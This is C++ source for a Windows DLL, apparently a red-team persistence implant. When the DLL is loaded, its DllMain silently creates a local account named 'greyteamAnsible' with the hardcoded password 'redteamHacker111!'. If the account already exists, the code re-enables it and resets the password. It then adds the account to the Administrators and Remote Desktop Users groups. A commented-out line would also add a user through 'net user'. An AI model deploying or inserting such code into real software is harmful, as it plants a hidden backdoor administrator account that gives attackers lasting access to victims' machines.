#include <windows.h>
#include <netfw.h>
#include <LMaccess.h>
#include <lmerr.h>
#include <lmapibuf.h>
#include <icftypes.h>
#include <stdio.h>
#include <string>
#pragma comment( lib, "netapi32.lib")


extern "C" __declspec(dllexport)
NET_API_STATUS userAdd() {
    // REQUIRES ADMINISTRATOR

    // Username and Added Groups
    LPWSTR userName = (LPWSTR)TEXT("greyteamAnsible");
    LPWSTR adminGroup = (LPWSTR)TEXT("Administrators");
    LPWSTR remoteGroup = (LPWSTR)TEXT("Remote Desktop Users");

    // Error Variables
    NET_API_STATUS err = 0;
    DWORD parm_err = 0;

    // Set up the USER_INFO_1 structure. 
    USER_INFO_1 user_info;
    user_info.usri1_name = userName;
    user_info.usri1_password = (LPWSTR)TEXT("redteamHacker111!");
    user_info.usri1_priv = USER_PRIV_USER;
    user_info.usri1_home_dir = NULL;
    user_info.usri1_comment = (LPWSTR)TEXT("Intial build script user");
    user_info.usri1_flags = UF_NORMAL_ACCOUNT;
    user_info.usri1_script_path = NULL;

    err = NetUserAdd(NULL, // PDC name
        1,                    // level 
        (LPBYTE)&user_info,  // input buffer 
        &parm_err);          // parameter in error 

    switch (err) {
    case 0:
        // Successfully Created User
        break;
    case NERR_UserExists:
        // User already exists

        // If user exists, overwrite flags (Should Re-nable Disabled Users)
        USER_INFO_1008 usriFlags;
        usriFlags.usri1008_flags = UF_NORMAL_ACCOUNT;
        NetUserSetInfo(NULL, userName, 1008, (LPBYTE)&usriFlags, NULL);

        // If user exists, overwrite password (Should change password back to what it should be)
        USER_INFO_1003 usriPass;
        usriPass.usri1003_password = (LPWSTR)TEXT("redteamHacker111!");
        NetUserSetInfo(NULL, userName, 1003, (LPBYTE)&usriPass, NULL);

        break;
    case ERROR_ACCESS_DENIED:
        // DENIED ACCESS USER not ADMINISTRATOR
        NetApiBufferFree(NULL);
        return(err);
    case NERR_InvalidComputer:
        // Invalid Computer
        NetApiBufferFree(NULL);
        return(err);
    default:
        // ERROR
        NetApiBufferFree(NULL);
        return (err);
    }

    // Adds Administrator Group to User
    LOCALGROUP_INFO_1 localAdmingroup;
    localAdmingroup.lgrpi1_name = adminGroup;

    LOCALGROUP_INFO_1 localRemotegroup;
    localRemotegroup.lgrpi1_name = remoteGroup;

    LOCALGROUP_MEMBERS_INFO_3 localgroup_members;
    localgroup_members.lgrmi3_domainandname = userName;

    err = NetLocalGroupAddMembers(
        NULL, //PDC Name
        adminGroup, // Group
        3, //Name
        (LPBYTE)&localgroup_members, //buffer for local group members
        1); //Count

    err = NetLocalGroupAddMembers(
        NULL, //PDC Name
        remoteGroup, // Group
        3, //Name
        (LPBYTE)&localgroup_members, //buffer for local group members
        1); //Count


    switch (err) {
    case 0:
        // User successfully added to local group
        MessageBox(NULL, L"Testing for Admin Level: User Added", L"Admin Found", 0x0);
        break;
    case ERROR_MEMBER_IN_ALIAS:
        // User already in local group
        MessageBox(NULL, L"Testing for Admin Level: Already in Group", L"Admin Found", 0x0);
        err = 0;
        break;
    default:
        MessageBox(NULL, L"Testing for Admin Level: ERROR", L"Admin Found", 0x0);
        // Error adding user to local group
        break;
    }

    NetApiBufferFree(NULL);
    return(err);
}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        // Testing for Presence 
        MessageBox(NULL, L"Testing for DLL Access", L"No Admin", 0x0);

        // Testing for Administrator Level
        userAdd();

        // Testing for LoadLibrary Presence
        // system("net user LoadLib /add");
        
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}